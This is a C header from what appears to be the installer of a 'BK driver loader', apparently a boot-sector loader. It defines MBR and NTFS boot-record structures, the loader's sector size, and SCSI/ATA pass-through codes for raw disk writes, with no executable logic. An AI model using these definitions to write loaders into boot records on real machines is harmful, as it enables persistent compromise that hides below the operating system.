//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.
//	
// module: install.h
// description: 
//	BK helper library. BK installation constants and structures.

// BIOS constants
#define		BIOS_DEFAULT_SECTOR_SIZE			0x200		// 512 bytes
#define		BIOS_MBR_MAGIC						0xaa55
#define		BIOS_PARTITION_TABLE_OFFSET			0x1be
#define		BIOS_MAX_PARTITION_COUNT			4
#define		BIOS_PARTITION_ACTIVE_FLAG			0x80
#define		BIOS_PARTITION_TYPE_INSTALLABLE		7

// BIOS structures
typedef struct _PARTITION_TABLE_ENTRY
{
	ULONG		ActiveFlag		: 8;
	ULONG		CHSStartSector	: 24;
	ULONG		Descriptor		: 8;
	ULONG		CHSEndSector	: 24;
	ULONG		LBAStartSector;
	ULONG		PartitionSize;	
}PARTITION_TABLE_ENTRY, *PPARTITION_TABLE_ENTRY;


typedef	struct	_PARTITION_TABLE	
{
	PARTITION_TABLE_ENTRY	Entry[BIOS_MAX_PARTITION_COUNT];
}PARTITION_TABLE, *PPARTITION_TABLE;


#pragma pack (push)
#pragma pack(1)

// BIOS Parameter block
typedef	struct _BPB
{
	USHORT		SectorSize;
	UCHAR		SectorsPerCluster;
	USHORT		RecervedSectors;
	UCHAR		NumberOfFats;			// for FAT only
	USHORT		MaxRDEntries;			// for FAT only
	USHORT		SmallSectorsCount;		// for FAT12/16 only
	UCHAR		MediaDescriptorId;		
	USHORT		SectorsPerFat;			// for FAT only
	USHORT		SectorsPerTrack;
	USHORT		NumberOfHeads;
	ULONG		NumberOfHiddenSectors;
	ULONG		FatTotalSectors;		// for FAT only
	ULONG		DriveNumber;
	ULONGLONG	VolumeTotalSectors;		// NTFS only
	ULONGLONG	MftStartingCluster;		// NTFS only
	ULONGLONG	MftMirrowCluster;		// NTFS only
	LONG		ClustersPerRecord;		// NTFS only
	ULONG		ClustersPerIndex;		// NTFS only
	ULONGLONG	VolumeSerialNumber;		// NTFS only
	ULONG		Checksum;
} BPB, *PBPB;

// Volume Boot Record
typedef struct	_VBR
{
	CHAR	JumpInstruction[3];
	CHAR	VolumeOemId[8];
	BPB		Bpb;
} VBR, *PVBR;

#pragma pack(pop)

#define		NTFS_OEM_ID				"NTFS    "
#define		NTFS_LOADER_SIZE		16		// sectors
#define		NTFS_LDR_HEADER_SIZE	0x20	// bytes


//
// SCSI IO Device Control Codes
//

#define FILE_DEVICE_SCSI 0x0000001b

#define IOCTL_SCSI_EXECUTE_IN   ((FILE_DEVICE_SCSI << 16) + 0x0011)
#define IOCTL_SCSI_EXECUTE_OUT  ((FILE_DEVICE_SCSI << 16) + 0x0012)
#define IOCTL_SCSI_EXECUTE_NONE ((FILE_DEVICE_SCSI << 16) + 0x0013)

//
// SMART support in atapi
//

#define IOCTL_SCSI_BASE                 FILE_DEVICE_CONTROLLER

#define IOCTL_SCSI_MINIPORT_SMART_VERSION           ((FILE_DEVICE_SCSI << 16) + 0x0500)
#define IOCTL_SCSI_MINIPORT_IDENTIFY                ((FILE_DEVICE_SCSI << 16) + 0x0501)
#define IOCTL_SCSI_MINIPORT_READ_SMART_ATTRIBS      ((FILE_DEVICE_SCSI << 16) + 0x0502)
#define IOCTL_SCSI_MINIPORT_READ_SMART_THRESHOLDS   ((FILE_DEVICE_SCSI << 16) + 0x0503)
#define IOCTL_SCSI_MINIPORT_ENABLE_SMART            ((FILE_DEVICE_SCSI << 16) + 0x0504)
#define IOCTL_SCSI_MINIPORT_DISABLE_SMART           ((FILE_DEVICE_SCSI << 16) + 0x0505)
#define IOCTL_SCSI_MINIPORT_RETURN_STATUS           ((FILE_DEVICE_SCSI << 16) + 0x0506)
#define IOCTL_SCSI_MINIPORT_ENABLE_DISABLE_AUTOSAVE ((FILE_DEVICE_SCSI << 16) + 0x0507)
#define IOCTL_SCSI_MINIPORT_SAVE_ATTRIBUTE_VALUES   ((FILE_DEVICE_SCSI << 16) + 0x0508)
#define IOCTL_SCSI_MINIPORT_EXECUTE_OFFLINE_DIAGS   ((FILE_DEVICE_SCSI << 16) + 0x0509)
#define IOCTL_SCSI_MINIPORT_ENABLE_DISABLE_AUTO_OFFLINE ((FILE_DEVICE_SCSI << 16) + 0x050a)
#define IOCTL_SCSI_MINIPORT_READ_SMART_LOG          ((FILE_DEVICE_SCSI << 16) + 0x050b)
#define IOCTL_SCSI_MINIPORT_WRITE_SMART_LOG         ((FILE_DEVICE_SCSI << 16) + 0x050c)


#define IOCTL_SCSI_PASS_THROUGH         CTL_CODE(IOCTL_SCSI_BASE, 0x0401, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_SCSI_MINIPORT             CTL_CODE(IOCTL_SCSI_BASE, 0x0402, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_SCSI_GET_INQUIRY_DATA     CTL_CODE(IOCTL_SCSI_BASE, 0x0403, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SCSI_GET_CAPABILITIES     CTL_CODE(IOCTL_SCSI_BASE, 0x0404, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SCSI_PASS_THROUGH_DIRECT  CTL_CODE(IOCTL_SCSI_BASE, 0x0405, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_SCSI_GET_ADDRESS          CTL_CODE(IOCTL_SCSI_BASE, 0x0406, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SCSI_RESCAN_BUS           CTL_CODE(IOCTL_SCSI_BASE, 0x0407, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SCSI_GET_DUMP_POINTERS    CTL_CODE(IOCTL_SCSI_BASE, 0x0408, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SCSI_FREE_DUMP_POINTERS   CTL_CODE(IOCTL_SCSI_BASE, 0x0409, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_IDE_PASS_THROUGH          CTL_CODE(IOCTL_SCSI_BASE, 0x040a, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_ATA_PASS_THROUGH          CTL_CODE(IOCTL_SCSI_BASE, 0x040b, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_ATA_PASS_THROUGH_DIRECT   CTL_CODE(IOCTL_SCSI_BASE, 0x040c, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)



typedef struct _SCSI_BUS_DATA {
  UCHAR NumberOfLogicalUnits;
  UCHAR InitiatorBusId;
  ULONG InquiryDataOffset;
} SCSI_BUS_DATA, *PSCSI_BUS_DATA;

typedef struct _SCSI_ADAPTER_BUS_INFO {
  UCHAR         NumberOfBuses;
  SCSI_BUS_DATA BusData[1];
} SCSI_ADAPTER_BUS_INFO, *PSCSI_ADAPTER_BUS_INFO;

typedef struct _SCSI_INQUIRY_DATA {
  UCHAR   PathId;
  UCHAR   TargetId;
  UCHAR   Lun;
  BOOLEAN DeviceClaimed;
  ULONG   InquiryDataLength;
  ULONG   NextInquiryDataOffset;
  UCHAR   InquiryData[1];
} SCSI_INQUIRY_DATA, *PSCSI_INQUIRY_DATA;

    //
    // Standard 10-byte CDB

typedef struct _CDB10 {
        UCHAR OperationCode;

        UCHAR RelativeAddress : 1;
        UCHAR Reserved1 : 2;
        UCHAR ForceUnitAccess : 1;
        UCHAR DisablePageOut : 1;
        UCHAR LogicalUnitNumber : 3;

        UCHAR LogicalBlockByte0;
        UCHAR LogicalBlockByte1;
        UCHAR LogicalBlockByte2;
        UCHAR LogicalBlockByte3;
        UCHAR Reserved2;
        UCHAR TransferBlocksMsb;
        UCHAR TransferBlocksLsb;
        UCHAR Control;
} CDB10, *PCDB10;


typedef struct _CDB16 {
        UCHAR OperationCode;
        UCHAR Reserved1        : 3;
        UCHAR ForceUnitAccess  : 1;
        UCHAR DisablePageOut   : 1;
        UCHAR Protection       : 3;
        UCHAR LogicalBlock[8];
        UCHAR TransferLength[4];
        UCHAR Reserved2;
        UCHAR Control;
} CDB16, *PCDB16;


    struct _READ16 {
        UCHAR OperationCode;      // 0x88 - SCSIOP_READ16
        UCHAR Reserved1         : 3;
        UCHAR ForceUnitAccess   : 1;
        UCHAR DisablePageOut    : 1;
        UCHAR ReadProtect       : 3;
        UCHAR LogicalBlock[8];
        UCHAR TransferLength[4];
        UCHAR Reserved2         : 7;
        UCHAR Streaming         : 1;
        UCHAR Control;
    } READ16;


typedef struct _SCSI_PASS_THROUGH_DIRECT {
    USHORT Length;
    UCHAR ScsiStatus;
    UCHAR PathId;
    UCHAR TargetId;
    UCHAR Lun;
    UCHAR CdbLength;
    UCHAR SenseInfoLength;
    UCHAR DataIn;
    ULONG DataTransferLength;
    ULONG TimeOutValue;
    PVOID DataBuffer;
    ULONG SenseInfoOffset;
	union
	{
		CDB10 Cdb10;
		CDB16 Cdb16;
		UCHAR Cdb[16];

	};
}SCSI_PASS_THROUGH_DIRECT, *PSCSI_PASS_THROUGH_DIRECT;



typedef struct _SCSI_PASS_THROUGH {
  USHORT  Length;
  UCHAR  ScsiStatus;
  UCHAR  PathId;
  UCHAR  TargetId;
  UCHAR  Lun;
  UCHAR  CdbLength;
  UCHAR  SenseInfoLength;
  UCHAR  DataIn;
  ULONG  DataTransferLength;
  ULONG  TimeOutValue;
  ULONG_PTR DataBufferOffset;
  ULONG  SenseInfoOffset;
  UCHAR  Cdb[16];
}SCSI_PASS_THROUGH, *PSCSI_PASS_THROUGH;


//
// Structures for SCSI pass through and SCSI pass through direct.
//
//  IA64 requires 8-byte alignment for pointers,
//  but the IA64 NT kernel expects 16-byte alignment
//
#ifdef _WIN64
    #define PTRALIGN    DECLSPEC_ALIGN(16)
#else
    #define PTRALIGN    DECLSPEC_ALIGN(4)
#endif

#define SPTWB_SENSE_LENGTH  32
#define SPTWB_DATA_LENGTH   512

typedef struct _SCSI_PASS_THROUGH_WITH_BUFFERS {
    SCSI_PASS_THROUGH   ScsiPassThrough;
    PTRALIGN UCHAR      SenseInfoBuffer[SPTWB_SENSE_LENGTH];
    PTRALIGN UCHAR      DataBuffer[SPTWB_DATA_LENGTH];
} SCSI_PASS_THROUGH_WITH_BUFFERS, *PSCSI_PASS_THROUGH_WITH_BUFFERS;

typedef struct _SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER {
    SCSI_PASS_THROUGH_DIRECT    ScsiPassThroughDirect;
    PTRALIGN UCHAR              SenseInfoBuffer[SPTWB_SENSE_LENGTH];
} SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, *PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER;


#define SCSI_IOCTL_DATA_OUT          0
#define SCSI_IOCTL_DATA_IN           1
#define SCSI_IOCTL_DATA_UNSPECIFIED  2


#define RAW_READ_CMD    0xBE // ATAPI RAW READ
#define WHATS_READ      0xF8 // Sync & All Headers & User Data + EDC/ECC
#define PACKET_LEN      2352 // длина одного сектора

#define	SCSIOP_READ		0x28
#define	SCSIOP_WRITE	0x2a
#define SCSIOP_WRITE_DATA_BUFF          0x3B
#define SCSIOP_READ_DATA_BUFF           0x3C

#define SCSIOP_READ16                   0x88
#define SCSIOP_WRITE16                  0x8A


#pragma pack (push)
#pragma pack (1)
typedef struct	_CHSS
{
	LARGE_INTEGER	StartSector;
	USHORT			NumberSectors;
} CHSS, *PCHSS;
#pragma pack (pop)


#define		BK_NAME_MAGIC		(ULONG)0x33333333
#define		BK_NAME_LENGTH		200						// bytes